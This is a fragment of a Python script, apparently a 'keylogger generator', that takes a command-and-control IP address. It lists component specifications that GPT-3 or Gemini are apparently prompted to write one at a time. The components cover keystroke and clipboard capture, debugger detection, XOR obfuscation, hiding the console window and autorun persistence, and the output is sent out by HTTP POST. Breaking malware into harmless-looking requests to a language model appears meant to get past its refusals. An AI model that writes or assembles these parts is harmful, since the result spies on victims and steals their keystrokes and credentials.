...
Usage: python gpt3_keylogger_fixed.py C2_IP_ADDRESS
"""
...
BUILDING_BLOCKS = [
    {"name": "Debugger Detection", "prototype": "BOOL CheckDebugger()",
     "description": "Check if a debugger is attached to the process", "expected_apis": ["IsDebuggerPresent"]},
    {"name": "XOR String Encoding", "prototype": "void XORString(char* data, int length, char key)",
     "description": "Encode a string using XOR with a key", "expected_apis": []},
    {"name": "Timestamp Generation", "prototype": "void GetCurrentTimestamp(char* buffer, int size)",
     "description": "Get current system time as formatted string", "expected_apis": ["GetLocalTime"]},
    {"name": "Active Window Title", "prototype": "void GetActiveWindowTitle(char* buffer, int size)",
     "description": "Get the title of the currently focused window",
     "expected_apis": ["GetForegroundWindow", "GetWindowText"]},
    {"name": "File Writing", "prototype": "BOOL WriteToLog(const char* data, const char* filename)",
     "description": "Append data to a log file", "expected_apis": ["CreateFile", "WriteFile", "CloseHandle"]},
    {"name": "Virtual Key Translation", "prototype": "char TranslateVirtualKey(int vKey, BOOL shifted)",
     "description": "Convert virtual key code to ASCII character", "expected_apis": ["MapVirtualKey", "ToAscii"]},
    {"name": "Keyboard State Polling", "prototype": "BOOL CheckKeyState(int vKey)",
     "description": "Check if a key is currently pressed", "expected_apis": ["GetAsyncKeyState"]},
    {"name": "Clipboard Monitoring", "prototype": "void GetClipboardContent(char* buffer, int size)",
     "description": "Retrieve current clipboard text",
     "expected_apis": ["OpenClipboard", "GetClipboardData", "CloseClipboard"]},
    {"name": "Process Hiding", "prototype": "void HideConsoleWindow()",
     "description": "Hide the console window from the user", "expected_apis": ["GetConsoleWindow", "ShowWindow"]},
    {"name": "AutoRun Persistence", "prototype": "BOOL SetAutoRun(const char* exePath)",
...
def main():
    ...
    print("=" * 70)
    print("Gemini Keylogger Generator with HTTP POST (CORRECTED)")
    print("=" * 70)
